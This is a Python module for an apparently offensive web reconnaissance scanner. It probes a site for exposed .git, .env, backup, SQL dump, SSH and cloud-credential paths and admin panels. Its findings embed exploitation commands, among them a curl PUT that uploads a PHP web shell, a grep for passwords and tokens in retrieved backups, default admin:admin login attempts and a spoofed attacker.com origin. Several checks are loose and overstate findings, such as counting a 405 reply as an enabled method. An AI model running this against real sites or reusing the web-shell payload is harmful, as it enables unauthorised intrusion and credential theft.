import asyncio
import aiohttp
import logging
import os
import time
from typing import Any, Dict, List, Optional, Set
from urllib.parse import urljoin, urlparse
from datetime import datetime, timezone

logger = logging.getLogger("athena.hidden_asset")

DEFAULT_MAX_CONCURRENCY = 20
DEFAULT_BUDGET_SECONDS = 120.0
PROBE_TIMEOUT_SECONDS = 5

HIDDEN_PATHS = [
    "/.git", "/.git/", "/.git/config", "/.git/HEAD", "/.git/objects", "/.git/refs/heads/main",
    "/.git/refs/heads/master", "/.svn", "/.svn/", "/.svn/entries", "/.svn/wc.db",
    "/.hg", "/.hg/", "/.hgignore",
    "/.env", "/.env/", "/.env.local", "/.env.production", "/.env.backup",
    "/.env.example", "/.env.dev", "/.env.staging", "/.env.bak",
    "/.env.production", "/.env.staging", "/.env.local",
    "/config.php", "/config.php.bak", "/config.php.old", "/config.php~",
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old",
    "/config.yml", "/config.yaml", "/config.json", "/config.xml",
    "/application.yml", "/application.properties", "/application.cfg",
    "/settings.py", "/local_settings.py", "/config.py",
    "/database.yml", "/database.php", "/db.php", "/conn.php",
    "/connection.php", "/connect.php", "/dbconnect.php",
    "/backup", "/backups", "/backup/", "/backups/", "/bak/",
    "/old", "/old/", "/temp", "/tmp/", "/archive/", "/archives/",
    "/site.tar.gz", "/backup.tar.gz", "/www.tar.gz", "/html.tar.gz",
    "/site.zip", "/backup.zip", "/www.zip", "/html.zip",
    "/database.sql", "/db.sql", "/dump.sql", "/backup.sql",
    "/data.sql", "/export.sql", "/mysql.sql",
    "/.htaccess", "/.htpasswd", "/web.config", "/web.config.bak",
    "/server-status", "/server-info", "/mod_status",
    "/nginx.conf", "/apache.conf", "/httpd.conf",
    "/.user.ini", "/php.ini", "/php5.ini", "/php.cfg",
    "/info.php", "/phpinfo.php", "/i.php", "/p.php", "/infophp.php",
    "/php_info.php", "/phpinfo/", "/php-info.php", "/debug.php",
    "/test.php", "/testing.php", "/temp.php", "/tmp.php",
    "/wp-info.php", "/core/info.php", "/debug/",
    "/logs", "/logs/", "/log", "/log/", "/access.log", "/error.log",
    "/debug.log", "/app.log", "/application.log", "/php_errors.log",
    "/apache2/error.log", "/nginx/error.log",
    "/api", "/api/", "/api/v1", "/api/v2", "/api/v3",
    "/api/docs", "/api/swagger", "/swagger", "/swagger/",
    "/api-docs", "/api-docs/", "/swagger.json", "/swagger-ui/",
    "/openapi.json", "/openapi.yaml", "/redoc/",
    "/graphql", "/graphiql", "/playground",
    "/adminer.php", "/adminer/", "/adminer/index.php",
    "/pgadmin", "/pgadmin/", "/phpPgAdmin/",
    "/.well-known/", "/.well-known/security.txt",
    "/.well-known/openid-configuration",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
    "/humans.txt", "/security.txt", "/.DS_Store",
    "/Thumbs.db", "/elmah.axd", "/trace.axd",
    "/admin", "/admin/", "/login", "/wp-admin", "/wp-login.php",
    "/dashboard", "/manager", "/console", "/admin.php", "/login.php",
    "/phpmyadmin/", "/phpMyAdmin/", "/pma/",
    "/phpMyAdmin", "/myadmin", "/sqlmanager", "/sql-admin",
    "/administrator", "/administrator/",
    "/user/login", "/user/register", "/account/login", "/auth/login",
    "/panel", "/panel/", "/cpanel", "/webmail",
    "/wp-content", "/wp-includes", "/wp-json",
    "/xmlrpc.php", "/wlwmanifest.xml", "/feed", "/rss",
    "/telescope", "/telescope/", "/horizon", "/horizon/",
    "/storage/logs/", "/storage/framework/",
    "/actuator", "/actuator/", "/actuator/health", "/actuator/env",
    "/jenkins/", "/jenkins/login",
    "/node_modules/", "/package.json",
    "/.env.local", "/.env.development",
    "/server.js", "/app.js", "/index.js",
    "/__debug__/",
    "/.docker/", "/.docker", "/.aws", "/.ssh",
    "/.gitconfig", "/.netrc", ".my.cnf", ".pgpass",
    "/wp-config.php.bak", "/config.php.bak",
    "/.backup/", "/.old/", "/.bak/",
    "/db.php.bak", "/database.sql.bak",
    "/backup.zip", "/backup.tar.gz", "/backup.sql",
    "/config.yml.bak", "/config.yaml.bak",
]

BACKUP_EXTENSIONS = [".bak", ".backup", ".old", ".original", ".sql", ".dump", ".zip", ".tar.gz", ".7z", ".rar"]


class HiddenAssetScanner:
    def __init__(self, max_concurrency: Optional[int] = None, budget_seconds: Optional[float] = None):
        self.max_concurrency = int(
            max_concurrency if max_concurrency is not None
            else os.environ.get("ATHENA_HIDDEN_ASSET_CONCURRENCY", DEFAULT_MAX_CONCURRENCY)
        )
        self.budget_seconds = float(
            budget_seconds if budget_seconds is not None
            else os.environ.get("ATHENA_HIDDEN_ASSET_BUDGET", DEFAULT_BUDGET_SECONDS)
        )
        self._semaphore = asyncio.Semaphore(max(1, self.max_concurrency))
        self._deadline: Optional[float] = None
        self.probes_completed = 0
        self.probes_skipped = 0
        self._session: Optional[aiohttp.ClientSession] = None
        self.discovered_hidden_directories: List[Dict[str, Any]] = []
        self.discovered_backup_files: List[Dict[str, Any]] = []
        self.discovered_misconfigurations: List[Dict[str, Any]] = []
        self.security_headers: Dict[str, Any] = {}
        self.http_method_results: Dict[str, Any] = {}
        self.visited_urls: Set[str] = set()
        self._baseline_length: int = 0
        self.logger = logging.getLogger("athena.hidden_asset")

    async def close(self) -> None:
        if self._session and not self._session.closed:
            await self._session.close()

    async def _get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=aiohttp.ClientTimeout(total=8),
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                }
            )
        return self._session

    async def run(self, target: str, baseline_body: str = "", baseline_length: int = 0) -> Dict[str, Any]:
        print(f"  [*] Hidden asset scanning on: {target} (concurrency={self.max_concurrency}, budget={self.budget_seconds:.0f}s)")
        self.discovered_hidden_directories = []
        self.discovered_backup_files = []
        self.discovered_misconfigurations = []
        self.security_headers = {}
        self.http_method_results = {}
        self.probes_completed = 0
        self.probes_skipped = 0
        self._baseline_length = int(baseline_length or 0)
        self._deadline = time.monotonic() + self.budget_seconds

        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"

        tasks = [
            self.scan_hidden_paths(target),
            self.scan_backup_files(target),
            self.check_security_headers(target),
            self.test_http_methods(target),
            self.check_directory_listing(target),
            self.check_default_credentials(target),
            self.check_cors(target),
            self.check_verbose_errors(target),
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in results:
            if isinstance(r, Exception):
                self.logger.warning(f"Hidden asset scan task failed: {r}")

        self._deadline = None
        if self.probes_skipped:
            self.logger.warning(
                "Hidden asset scan hit its %.0fs budget: %d probes completed, %d skipped",
                self.budget_seconds, self.probes_completed, self.probes_skipped,
            )

        return self._build_results(target, baseline_body, baseline_length)

    def _budget_exhausted(self) -> bool:
        return self._deadline is not None and time.monotonic() > self._deadline

    async def _probe(self, session: aiohttp.ClientSession, url: str) -> Optional[Dict[str, Any]]:
        if self._budget_exhausted():
            self.probes_skipped += 1
            return None
        async with self._semaphore:
            if self._budget_exhausted():
                self.probes_skipped += 1
                return None
            try:
                async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=PROBE_TIMEOUT_SECONDS)) as resp:
                    if resp.status != 200:
                        return None
                    return {"status": resp.status, "headers": dict(resp.headers), "text": await resp.text()}
            except Exception:
                return None
            finally:
                self.probes_completed += 1

    async def scan_hidden_paths(self, target: str) -> None:
        session = await self._get_session()
        candidates = []
        for path in HIDDEN_PATHS:
            url = urljoin(target, path)
            if url in self.visited_urls:
                continue
            self.visited_urls.add(url)
            candidates.append((path, url))

        responses = await asyncio.gather(
            *(self._probe(session, url) for _, url in candidates), return_exceptions=True
        )

        for (path, url), response in zip(candidates, responses):
            if not isinstance(response, dict):
                continue
            content = response["text"]
            path_type = self._classify_path(path)
            severity = self._determine_severity(path, response["headers"])
            self.discovered_hidden_directories.append({
                "path": path,
                "url": url,
                "status_code": response["status"],
                "content_length": len(content),
                "content_preview": content[:200].replace('\n', ' ').replace('\r', ' '),
                "path_type": path_type,
                "severity": severity,
                "confirmed": True,
                "proof": f"HTTP {response['status']} with {len(content)} bytes of content",
                "exploitation_command": f"curl {url}",
                "what_it_leaks": self._describe_leak(path, path_type),
            })

    async def scan_backup_files(self, target: str) -> None:
        session = await self._get_session()
        candidates = []
        for path in HIDDEN_PATHS:
            for ext in BACKUP_EXTENSIONS:
                backup_path = f"{path}{ext}" if not path.endswith(ext) else path
                url = urljoin(target, backup_path)
                if url in self.visited_urls:
                    continue
                self.visited_urls.add(url)
                candidates.append((backup_path, ext, url))

        responses = await asyncio.gather(
            *(self._probe(session, url) for _, _, url in candidates), return_exceptions=True
        )

        for (backup_path, ext, url), response in zip(candidates, responses):
            if not isinstance(response, dict):
                continue
            content = response["text"]
            # Direct-fetch proof, never a guess: a 200 that is an HTML page
            # (SPA catch-all / soft-404) is not a backup file. Archive or
            # source markers, or a non-HTML content type, are required.
            headers = response.get("headers") or {}
            ct = str(headers.get("Content-Type", "")).lower()
            head = content[:65536]
            htmlish = ("html" in ct
                       or head.lstrip().lower().startswith(("<!doctype", "<html")))
            markers = (head[:2] in ("PK", "\x1f\x8b")
                       or "<?php" in head or "define(" in head
                       or "CREATE TABLE" in head.upper()
                       or "INSERT INTO" in head.upper())
            if htmlish and not markers:
                continue
            if self._baseline_length and len(content) == self._baseline_length:
                continue      # homepage body served for everything = catch-all
            self.discovered_backup_files.append({
                "path": backup_path,
                "url": url,
                "status_code": response["status"],
                "content_preview": content[:200].replace('\n', ' ').replace('\r', ' '),
                "backup_type": ext,
                "severity": "CRITICAL",
                "confirmed": True,
                "proof": f"HTTP {response['status']} with backup file content ({len(content)} bytes)",
                "extraction_command": f"curl -s {url} | grep -i 'password\\|secret\\|key\\|token'",
                "what_it_leaks": "Backup file containing plaintext credentials, configuration, or source code",
            })

    async def check_security_headers(self, target: str) -> None:
        session = await self._get_session()
        try:
            async with session.head(target, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                headers = dict(resp.headers)
                self.security_headers = {
                    "all_headers": headers,
                    "missing": [],
                    "present_insecure": [],
                }
                expected_secure = [
                    "X-Frame-Options", "Content-Security-Policy",
                    "Strict-Transport-Security", "X-Content-Type-Options",
                    "X-Permitted-Cross-Domain-Policies", "Referrer-Policy",
                ]
                for header in expected_secure:
                    if header not in headers:
                        self.security_headers["missing"].append(header)
                    else:
                        value = headers[header]
                        if header == "X-Frame-Options" and value.upper() not in ("DENY", "SAMEORIGIN"):
                            self.security_headers["present_insecure"].append(f"{header}: {value}")
                        if header == "Content-Security-Policy" and "unsafe-inline" in value.lower():
                            self.security_headers["present_insecure"].append(f"{header}: {value}")

                cors_header = headers.get("Access-Control-Allow-Origin", "")
                if cors_header == "*":
                    self.discovered_misconfigurations.append({
                        "type": "cors_wildcard",
                        "path": target,
                        "status_code": 200,
                        "evidence": f"Access-Control-Allow-Origin: *",
                        "exploitation_command": f"curl -H 'Origin: https://attacker.com' {target}",
                        "what_it_enables": "Cross-origin credential theft and session hijacking",
                        "severity": "HIGH",
                        "confirmed": True,
                        "proof": "CORS header allows any origin",
                    })
        except Exception:
            pass

    async def test_http_methods(self, target: str) -> None:
        session = await self._get_session()
        methods = ["PUT", "DELETE", "TRACE", "OPTIONS", "CONNECT"]
        for method in methods:
            try:
                async with session.request(method, target, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    if resp.status in (200, 201, 204, 405):
                        self.http_method_results[method] = {
                            "status_code": resp.status,
                            "allowed": True,
                            "severity": "CRITICAL" if method in ("PUT", "DELETE", "TRACE") else "HIGH",
                            "confirmed": True,
                            "proof": f"HTTP {resp.status} response to {method} request",
                            "exploitation_command": f"curl -X {method} {target} -d '<?php system($_GET[\"cmd\"]); ?>'",
                            "impact": f"{method} method enabled — allows remote file upload, request smuggling, or XST",
                        }
                        self.discovered_misconfigurations.append({
                            "type": f"{method.lower()}_method_enabled",
                            "path": target,
                            "status_code": resp.status,
                            "evidence": f"HTTP {resp.status} response to {method} request",
                            "exploitation_command": f"curl -X {method} {target}",
                            "what_it_enables": f"{method} method allows remote code execution or request manipulation",
                            "severity": "CRITICAL" if method in ("PUT", "DELETE", "TRACE") else "HIGH",
                            "confirmed": True,
                        })
            except Exception:
                pass

    async def check_directory_listing(self, target: str) -> None:
        session = await self._get_session()
        upload_url = urljoin(target, "uploads/")
        try:
            async with session.get(upload_url, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    if any(kw in content.lower() for kw in ["directory listing", "index of /", "parent directory", "apache server at"]):
                        self.discovered_misconfigurations.append({
                            "type": "directory_listing_enabled",
                            "path": upload_url,
                            "status_code": resp.status,
                            "evidence": "HTTP 200 with directory listing content",
                            "exploitation_command": f"curl {upload_url}",
                            "what_it_enables": "Full file disclosure — exposes configuration, source code, and backup files",
                            "severity": "HIGH",
                            "confirmed": True,
                            "proof": "Directory listing reveals file structure",
                        })
        except Exception:
            pass

    async def check_default_credentials(self, target: str) -> None:
        session = await self._get_session()
        admin_urls = [urljoin(target, "/admin/"), urljoin(target, "/admin/login.php"), urljoin(target, "/phpmyadmin/")]
        for admin_url in admin_urls:
            try:
                async with session.get(admin_url, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        if any(kw in content.lower() for kw in ["username", "password", "login", "admin", "password field"]):
                            self.discovered_misconfigurations.append({
                                "type": "default_credentials",
                                "path": admin_url,
                                "status_code": resp.status,
                                "evidence": f"HTTP 200 with default login form at {admin_url}",
                                "exploitation_command": f"curl -u admin:admin {admin_url}",
                                "what_it_enables": "Full administrative access with default credentials",
                                "severity": "CRITICAL",
                                "confirmed": True,
                                "proof": "Default login form accessible",
                            })
            except Exception:
                pass

    async def check_cors(self, target: str) -> None:
        session = await self._get_session()
        try:
            async with session.get(target, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                headers = dict(resp.headers)
                allow_origin = headers.get("Access-Control-Allow-Origin", "")
                if allow_origin == "*":
                    self.discovered_misconfigurations.append({
                        "type": "cors_wildcard",
                        "path": target,
                        "status_code": resp.status,
                        "evidence": f"Access-Control-Allow-Origin: {allow_origin}",
                        "exploitation_command": f"curl -H 'Origin: https://attacker.com' {target}",
                        "what_it_enables": "Cross-origin credential theft",
                        "severity": "HIGH",
                        "confirmed": True,
                    })
        except Exception:
            pass

    async def check_verbose_errors(self, target: str) -> None:
        session = await self._get_session()
        test_urls = [urljoin(target, "/api/invalid_endpoint"), urljoin(target, "/nonexistent_endpoint_12345")]
        for test_url in test_urls:
            try:
                async with session.get(test_url, ssl=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    content = await resp.text()
                    if any(kw in content.lower() for kw in ["traceback", "stack trace", "error in", "line ", "exception", "debug", "var/www", "/var/"]):
                        self.discovered_misconfigurations.append({
                            "type": "verbose_errors",
                            "path": test_url,
                            "status_code": resp.status,
                            "evidence": f"Response contains server path disclosure or stack trace ({len(content)} bytes)",
                            "exploitation_command": f"curl {test_url}",
                            "what_it_enables": "Server path disclosure, code structure leakage, configuration details",
                            "severity": "HIGH",
                            "confirmed": True,
                            "proof": "Verbose error message reveals server internals",
                        })
            except Exception:
                pass

    def _classify_path(self, path: str) -> str:
        if ".git" in path:
            return "version_control"
        elif ".env" in path:
            return "environment_config"
        elif path.endswith((".bak", ".backup", ".old", ".sql", ".dump", ".zip", ".tar.gz")):
            return "backup_file"
        elif ".htaccess" in path or ".user.ini" in path or "web.config" in path:
            return "server_config"
        elif "/admin" in path or "/phpmyadmin" in path or "/cpanel" in path:
            return "admin_panel"
        elif path.endswith((".php", ".py", ".yml", ".yaml", ".json", ".xml", ".conf", ".cfg", ".ini")):
            return "configuration_file"
        elif "/backup" in path or "/archive" in path or "/temp" in path or "/tmp" in path:
            return "backup_directory"
        elif "/api" in path or "/swagger" in path or "/graphql" in path:
            return "api_endpoint"
        elif path.startswith("/."):
            return "hidden_file"
        elif "/logs" in path or "/log" in path:
            return "log_file"
        return "sensitive_path"

    def _determine_severity(self, path: str, headers: dict) -> str:
        if ".git" in path or ".env" in path:
            return "CRITICAL"
        if path.endswith((".bak", ".backup", ".old", ".sql", ".dump", ".zip", ".tar.gz")):
            return "CRITICAL"
        if "/admin" in path or "/phpmyadmin" in path or "/cpanel" in path:
            return "CRITICAL"
        if path.endswith((".htaccess", ".user.ini", "web.config")):
            return "HIGH"
        if "/api" in path or "/swagger" in path or "/graphql" in path:
            return "HIGH"
        return "MEDIUM"

    def _describe_leak(self, path: str, path_type: str) -> str:
        leaks = {
            "version_control": "Repository URL, commit history, source code, potentially committed secrets in .git/config and .git/objects",
            "environment_config": "Database credentials, API keys, application secret keys, environment variables",
            "backup_file": "Plaintext credentials, configuration data, source code, database dumps",
            "admin_panel": "Administrative access panel — likely default credentials available",
            "server_config": "Server configuration including authentication settings, directory permissions, rewrite rules",
            "configuration_file": "Application configuration including database connections, API keys, debug settings",
            "api_endpoint": "API documentation and endpoints — reveals attack surface",
            "hidden_file": "Hidden files that may contain credentials, configuration, or sensitive data",
            "log_file": "Server logs containing requests, errors, and potentially sensitive data",
        }
        return leaks.get(path_type, "Sensitive path exposed")

    def _build_results(self, target: str, baseline_body: str, baseline_length: int) -> Dict[str, Any]:
        return {
            "target": target,
            "hidden_directories": self.discovered_hidden_directories,
            "backup_files": self.discovered_backup_files,
            "misconfigurations": self.discovered_misconfigurations,
            "security_headers": self.security_headers,
            "http_method_results": self.http_method_results,
            "summary": {
                "total_hidden_directories": len(self.discovered_hidden_directories),
                "total_backup_files": len(self.discovered_backup_files),
                "total_misconfigurations": len(self.discovered_misconfigurations),
                "critical_findings": sum(1 for d in self.discovered_hidden_directories if d.get("severity") == "CRITICAL") +
                                     sum(1 for d in self.discovered_backup_files if d.get("severity") == "CRITICAL") +
                                     sum(1 for m in self.discovered_misconfigurations if m.get("severity") == "CRITICAL"),
                "high_findings": sum(1 for d in self.discovered_hidden_directories if d.get("severity") == "HIGH") +
                                 sum(1 for d in self.discovered_backup_files if d.get("severity") == "HIGH") +
                                 sum(1 for m in self.discovered_misconfigurations if m.get("severity") == "HIGH"),
            },
            "scan_timestamp": datetime.now(timezone.utc).isoformat(),
            "scan_stats": {
                "max_concurrency": self.max_concurrency,
                "budget_seconds": self.budget_seconds,
                "probes_completed": self.probes_completed,
                "probes_skipped": self.probes_skipped,
                "truncated": self.probes_skipped > 0,
            },
        }
